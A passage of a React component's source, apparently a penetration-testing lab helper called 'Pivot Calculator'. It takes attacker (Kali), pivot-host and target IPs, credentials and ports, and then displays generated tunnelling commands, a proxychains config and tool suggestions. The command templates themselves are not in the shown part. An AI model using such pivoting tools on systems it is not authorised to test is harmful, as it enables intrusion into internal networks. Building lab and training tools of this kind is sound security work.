        .wiz-toggle{width:100%;background:#0a1520;border:none;padding:.6rem 1rem;color:#4a90d9;font-family:'JetBrains Mono',monospace;font-size:.68rem;cursor:pointer;text-align:left;display:flex;justify-content:space-between;align-items:center;transition:all .12s}
        .wiz-toggle:hover{background:#0d1a2e}
        .wiz-toggle.open{border-bottom:1px solid #1e3a5f}
        .wiz-inner{background:#060d18;padding:1.1rem}
        .wiz-breadcrumb{display:flex;flex-wrap:wrap;gap:.2rem;margin-bottom:.75rem;font-size:.55rem;color:#2d4a6b}
        .wiz-bc-sep{margin:0 .2rem}
        .wiz-q{font-size:.82rem;color:#c8d6e5;font-weight:600;margin-bottom:.5rem;line-height:1.4}
        .wiz-hint{font-size:.62rem;color:#4a6580;margin-bottom:.75rem;font-style:italic}
        .wiz-opts{display:flex;flex-direction:column;gap:.4rem;margin-bottom:.75rem}
        .wiz-opt{background:#0a1018;border:1px solid #1e2d40;border-radius:5px;padding:.55rem .8rem;color:#7a9bbf;font-family:'JetBrains Mono',monospace;font-size:.7rem;cursor:pointer;text-align:left;transition:all .15s}
        .wiz-opt:hover{border-color:#4a90d9;color:#c8d6e5;background:#0d1828}
        .wiz-back,.wiz-reset{background:none;border:1px solid #1e2d40;border-radius:4px;padding:.3rem .6rem;color:#4a5568;font-family:'JetBrains Mono',monospace;font-size:.62rem;cursor:pointer;margin-right:.4rem;transition:all .12s}
        .wiz-back:hover{color:#c8d6e5;border-color:#4a5568}
        .wiz-result{display:flex;flex-direction:column;gap:.6rem}
        .wiz-rec-label{font-size:.58rem;text-transform:uppercase;letter-spacing:.1em;color:#4a5568}
        .wiz-rec-method{font-size:1.1rem;font-family:'Syne',sans-serif;font-weight:800;color:#4ade80}
        .wiz-rec-why{font-size:.72rem;color:#a0c4e8;line-height:1.5}
        .wiz-rec-when{font-size:.65rem;color:#4a6580;font-style:italic}
        .wiz-btns{display:flex;align-items:center;gap:.4rem;flex-wrap:wrap;margin-top:.25rem}
        .wiz-use{background:#0d1f10;border:1px solid #4ade80;border-radius:5px;padding:.4rem .9rem;color:#4ade80;font-family:'JetBrains Mono',monospace;font-size:.7rem;cursor:pointer;transition:all .12s}
        .wiz-use:hover{background:#152a18}
      `}</style>

      <div className="hdr">
        <a href="/" className="back">← The Path</a>
        <div className="title">Pivot Calculator</div>
        <div className="sub">Fill in your IPs → get exact commands</div>
      </div>

      <div className="body">

        {/* DIAGRAM */}
        <div className="diag">
          {diagNodes.map((node,i,arr) => (
            <div key={node.label} style={{display:"contents"}}>
              <div className="dn">
                <div className="db" style={{borderColor:node.color,color:node.color}}>
                  <div className="dl">{node.label}</div>
                  <div className="dip">{node.ip}</div>
                </div>
              </div>
              {i<arr.length-1 && (
                <div className="darr">
                  <div className="dline"/>
                  <div className="dport">{i===0?`:${f.listenPort||f.socksPort||"..."}`:`:${f.targetPort||"..."}`}</div>
                </div>
              )}
            </div>
          ))}
        </div>

        {/* WIZARD */}
        <div className="wiz-wrap">
          <button className={`wiz-toggle${showWiz?" open":""}`} onClick={()=>setShowWiz(v=>!v)}>
            <span>🧭 Not sure which method? — Answer 2-3 questions</span>
            <span>{showWiz?"▲":"▼"}</span>
          </button>
          {showWiz && (
            <div className="wiz-inner">
              <Wizard onSelect={(m)=>{ setMethod(m); setShowWiz(false); }} />
            </div>
          )}
        </div>

        {/* METHOD */}
        <div className="sec">
          <div className="stitle">01 — Method</div>
          <div className="mgrid">
            {methods.map(m=>(
              <button key={m.id} className={`mbtn${method===m.id?" active":""}`} onClick={()=>setMethod(m.id)}>{m.label}</button>
            ))}
          </div>
        </div>

        {/* PROTOCOL */}
        <div className="sec">
          <div className="stitle">02 — Target Protocol</div>
          <div className="pgrid">
            {protocols.map(p=>(
              <button key={p.id} className={`pbtn${proto===p.id?" active":""}`} onClick={()=>handleProto(p.id,p.port)}>
                {p.label}{p.port?` (${p.port})`:""}
              </button>
            ))}
          </div>
        </div>

        {/* INPUTS */}
        <div className="sec">
          <div className="stitle">
            <span>03 — Your Network</span>
            <button className={`h2btn${showH2?" active":""}`} onClick={()=>setShowH2(v=>!v)}>
              {showH2?"− Remove second hop":"+ Add second hop"}
            </button>
          </div>
          <div className="igrid">
            {[
              ["kaliIp","Kali IP (tun0)","192.168.45.210"],
              ["pivotExtIp","Pivot External IP","192.168.50.63"],
              ["pivotIntIp","Pivot Internal IP","10.4.50.63"],
              ["pivotUser","Pivot User","database_admin"],
              ["pivotPass","Pivot Password",""],
              ["targetIp","Target (Internal) IP","172.16.50.217"],
              ["targetPort","Target Port","445"],
              ["listenPort","Local Listen Port","4455"],
              ["socksPort","SOCKS Port","9999"],
            ].map(([k,label,ph])=>(
              <div key={k} className="fld">
                <label>{label}</label>
                <input value={f[k]} onChange={set(k)} placeholder={ph} type={k==="pivotPass"?"password":"text"} />
              </div>
            ))}
          </div>
          {showH2 && (
            <div className="h2sec">
              <div className="h2lbl">⬡ Second Hop — Double Pivot</div>
              <div className="igrid">
                {[
                  ["hop2Ip","Pivot 2 IP","172.16.50.100"],
                  ["hop2Port","Pivot 2 SSH Port","22"],
                  ["hop2User","Pivot 2 User","user"],
                  ["hop2ListenPort","Second Listen Port","4466"],
                ].map(([k,label,ph])=>(
                  <div key={k} className="fld">
                    <label>{label}</label>
                    <input value={f[k]} onChange={set(k)} placeholder={ph} />
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>

        {/* COMMANDS */}
        <div className="sec">
          <div className="stitle">
            <div className="chwrap">
              <span>04 — Generated Commands</span>
              {cmds.length>0 && <ObsBtn blocks={cmds} />}
            </div>
          </div>
          {cmds.length===0 ? (
            <div className="empty">Select a method above</div>
          ) : (
            <div className="carea">
              {cmds.map((c,i)=>(
                <div key={i} className="cblock">
                  <div className="cheader">
                    <span className="clabel">{c.label}</span>
                    <CopyBtn text={c.cmd} />
                  </div>
                  <pre className="ctext">{c.cmd}</pre>
                  {c.note && <div className="cnote">💡 {c.note}</div>}
                  {c.verify && (
                    <div className="cverify">
                      <span className="vlabel">✓ verify</span>
                      <pre className="vtext">{c.verify}</pre>
                      <CopyBtn text={c.verify} label="⎘" />
                    </div>
                  )}
                </div>
              ))}

              {/* Auto proxychains config */}
              {socks && (
                <div className="cblock pc-block">
                  <div className="cheader">
                    <span className="clabel">▶ /etc/proxychains4.conf — auto-generated</span>
                    <CopyBtn text={pcConf} />
                  </div>
                  <pre className="ctext">{pcConf}</pre>
                  <div className="cnote">💡 Replace the [ProxyList] section at the bottom of the file</div>
                </div>
              )}

              {/* Tool suggestions */}
              {tools && proto!=="custom" && (
                <div className="cblock tl-block">
                  <div className="cheader">
                    <span className="clabel">▶ Tools to run — {selProto?.label} :{f.targetPort||selProto?.port}</span>
                    <CopyBtn text={tools} />
                  </div>
                  <pre className="ctext">{tools}</pre>
                </div>
              )}
            </div>
          )}
        </div>

      </div>
    </div>
  );
}
